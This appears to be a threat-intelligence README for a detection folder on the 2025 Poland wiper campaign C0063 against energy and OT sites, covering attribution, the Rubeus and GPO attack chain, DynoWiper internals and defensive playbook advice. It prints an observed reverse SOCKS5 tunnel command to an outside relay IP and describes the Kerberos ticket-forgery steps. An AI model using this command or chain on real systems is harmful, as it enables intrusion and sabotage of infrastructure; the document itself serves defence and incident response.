---
date: 2026-05-04
title: "C0063 Poland Wiper Attacks (DynoWiper + LazyWiper)"
clusters:
  - "Static Tundra"
  - "Sandworm"
  - "APT44"
  - "G0034"
  - "Seashell Blizzard"
cluster_country: "Russia-nexus (FSB Center 16 / GRU 74455 — contested)"
techniques_enterprise:
  - T1133
  - T1190
  - T1078
  - T1059.001
  - T1059.003
  - T1003.001
  - T1558.003
  - T1550.003
  - T1484.001
  - T1037.003
  - T1070.001
  - T1090.002
  - T1071.001
  - T1098.002
  - T1485
  - T1561.002
  - T1490
  - T1529
techniques_ics:
  - T0883
  - T0866
  - T0822
  - T0855
  - T0832
  - T0831
  - T0813
  - T0815
  - T0826
  - T0809
  - T0816
  - T0857
platforms:
  - windows
  - active-directory
  - ot-ics
  - network-edge
sectors:
  - energy
  - chp-plant
  - wind-solar
  - water-wastewater
  - manufacturing
---

# 2026-05-04 — C0063 Poland Wiper Attacks (DynoWiper + LazyWiper)

> Two undocumented wipers (DynoWiper Win32 + LazyWiper PowerShell) pushed via **GPO** against ~30 wind & solar farms, a CHP plant serving 500 000 customers, Hitachi RTUs, Mikronika controllers, protection relays, HMIs and Moxa serial gateways in Poland on **29-dec-2025**.

## Attribution (contested — high CTI value)
- **CERT Polska → Static Tundra (FSB Center 16)** — *high confidence*
- **ESET / Dragos → Sandworm / APT44 / G0034 (GRU Unit 74455)** — *medium confidence*
- **MITRE Campaign:** [`C0063 — 2025 Poland Wiper Attacks`](https://attack.mitre.org/campaigns/C0063/)
- Microsoft (overlap): Seashell Blizzard / IRIDIUM / FROZENBARENTS

The infrastructure evidence anchors FSB; the malware evidence anchors GRU. Document both in any internal CTI assessment.

## Initial access
**FortiGate VPN/SSL portal** exposed to the Internet, no MFA, default/weak credentials, unpatched firmware. Post-access **factory reset** to wipe local logs (a Volt-Typhoon-class anti-forensics move).

## AD compromise chain
1. `rubeus.exe` → request TGT for domain admin
2. S4U2self forge service ticket
3. **GPO Computer Startup Script weaponization** → mass-deploy DynoWiper + LazyWiper

## Toolkit observed
- `C:\Users\<USER>\Downloads\rubeus.exe`
- `C:\Users\<USER>\Downloads\r.exe -r 31.172.71[.]5:8008` (rsocx reverse SOCKS5)
- `C:\inetpub\pub\schtask.exe`, `schtask2.exe`, `<redacted>_update.exe` (DynoWiper)

## DynoWiper RE highlights
- Win32 PE 32-bit, Visual C++ 2013 (MSVCR120)
- PDB: `C:\Users\vagrant\Documents\Visual Studio 2013\Projects\Source\Release\Source.pdb` ← **gold heuristic IOC**
- PRNG: `std::mt19937` (MT19937) seed const + `std::random_device`
- Wipe: 16-byte random buffer (single-shot, same pattern across all files); files ≤16 B fully overwritten; >16 B → header-only overwrite (the bug that leaves recovery possible)
- Skiplist: `System32`, `Windows`, `Program Files`, `Program Files (x86)`
- Final: `ExitWindowsEx(EWX_FORCE | EWX_REBOOT, 0)`
- ESET detection: `Win32/KillFiles.NMO`

## C2 / relay box
`31.172.71.5:8008` = ProGame (`progamevl[.]ru`), Vladivostok kids' coding school, **compromised** (typical Russian operational relay box pattern).

## OT impact
- Hitachi RTUs — firmware corruption (T0857)
- Mikronika controllers — wiped
- Protection relays — disabled (T0815 Denial of View)
- HMIs — DynoWiper
- Moxa serial gateways — sabotaged

No blackout (CERT Polska + ESET PROTECT mitigation), but **control and visibility lost** in some segments.

## Kill chain (MITRE ATT&CK Enterprise + ICS)

| Tactic | Technique |
|---|---|
| Initial Access | T1133 · T1190 · T1078 |
| Execution | T1059.001 · T1059.003 |
| Credential Access | T1003.001 · T1558.003 |
| Privilege Escalation | T1550.003 (S4U2self forge) |
| Persistence / Defense Evasion | T1484.001 · T1037.003 · T1070.001 |
| C2 | T1090.002 · T1071.001 |
| Lateral Movement | T1098.002 |
| Impact | T1485 · T1561.002 · T1490 · T1529 |
| ICS | T0883 · T0866 · T0822 · T0855 · T0832 · T0831 · T0813 · T0815 · T0826 · T0809 · T0816 · T0857 |

## Pedagogical anchors
- **GPO weaponization is now cross-cluster** (e-crime The Gentlemen + RaaS VECT 2.0 + Russia-nexus C0063): not ransomware-only.
- **Static Tundra ↔ Sandworm dual attribution** is the new normal in Russia 2024-2026; describe with calibrated confidence (Sherman Kent / IC ICD-203).
- DynoWiper's 16-byte head-only bug **leaves partial recovery possible** for large OT files (`.acd` Studio 5000, RTU firmware blobs) — document in playbook.
- **Do not power off PLCs/RTUs** during triage without coordinating with safety/operations.
- **krbtgt double-rotation mandatory** (≥10h gap) after Rubeus/s4u observed.
- Edge devices factory-reset by attacker → recover from corporate config backup, compare against known baseline.
- **Do not block by hash without an ESET / CERT Polska–confirmed SHA256.**

## What's in this folder

| File | Description |
|---|---|
| [`sigma/gpo_startup_script_weaponization.yml`](sigma/gpo_startup_script_weaponization.yml) | Sigma — GPO Computer Startup script weaponization (T1484.001) |
| [`kql/lsass_dump_via_taskmgr.kql`](kql/lsass_dump_via_taskmgr.kql) | Sentinel/Defender XDR — LSASS dump via Task Manager |
| [`kql/rubeus_s4u_tgs_burst.kql`](kql/rubeus_s4u_tgs_burst.kql) | Sentinel — Rubeus s4u/asktgt + 4769 burst correlation |
| [`spl/rsocx_socks5_egress_and_gpo_writes.spl`](spl/rsocx_socks5_egress_and_gpo_writes.spl) | Splunk — rsocx outbound + GPO mass-write |
| [`yara/DynoWiper_Sandworm_C0063_Heuristic.yar`](yara/DynoWiper_Sandworm_C0063_Heuristic.yar) | YARA — DynoWiper PDB + skiplist + MT19937 + ExitWindowsEx |
| [`hunts/peak_h1_h2_h3.md`](hunts/peak_h1_h2_h3.md) | PEAK hunting hypotheses |
| [`iocs.csv`](iocs.csv) | IOC table |

## Sources

- [Energy Sector Incident Report — 29 December 2025 (CERT Polska, 30-jan-2026)](https://cert.pl/en/posts/2026/01/incident-report-energy-sector-2025/)
- [DynoWiper update: Technical analysis and attribution (ESET WeLiveSecurity, 2026)](https://www.welivesecurity.com/en/eset-research/dynowiper-update-technical-analysis-attribution/)
- [ESET Research: Sandworm behind cyberattack on Poland's power grid in late 2025](https://www.welivesecurity.com/en/eset-research/eset-research-sandworm-cyberattack-poland-power-grid-late-2025/)
- [2025 Poland Wiper Attacks — Campaign C0063 (MITRE ATT&CK)](https://attack.mitre.org/campaigns/C0063/)
- [Sandworm Team — Group G0034 (MITRE ATT&CK)](https://attack.mitre.org/groups/G0034/)
- [Under the Hood of DynoWiper (SANS Internet Storm Center, 19-feb-2026)](https://isc.sans.edu/diary/32730)
- [DYNOWIPER: Destructive Malware Targeting Poland's Energy Sector (Elastic Security Labs)](https://www.elastic.co/security-labs/dynowiper)
- [The Hacker News — New DynoWiper Malware (26-jan-2026)](https://thehackernews.com/2026/01/new-dynowiper-malware-used-in-attempted.html)
